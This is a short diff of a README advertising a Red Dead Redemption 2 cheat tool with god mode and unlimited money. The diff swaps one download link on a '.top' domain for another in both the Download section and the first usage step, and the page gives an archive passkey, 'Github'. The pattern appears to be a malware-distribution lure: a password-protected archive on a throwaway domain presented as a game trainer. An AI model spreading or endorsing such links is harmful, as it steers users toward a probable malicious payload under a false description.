@@ -6,7 +6,7 @@ Red Dead Redemption 2 external hack with God Mode, unlimited money, horse god mo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -88,7 +88,7 @@ Based on community projects like **Rampage Trainer**, **Fortitude**, and **Horse
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Install ScriptHookRDR2.
 3. Place the files in your RDR2 root folder.
 4. Launch RDR2 and load into Story Mode.
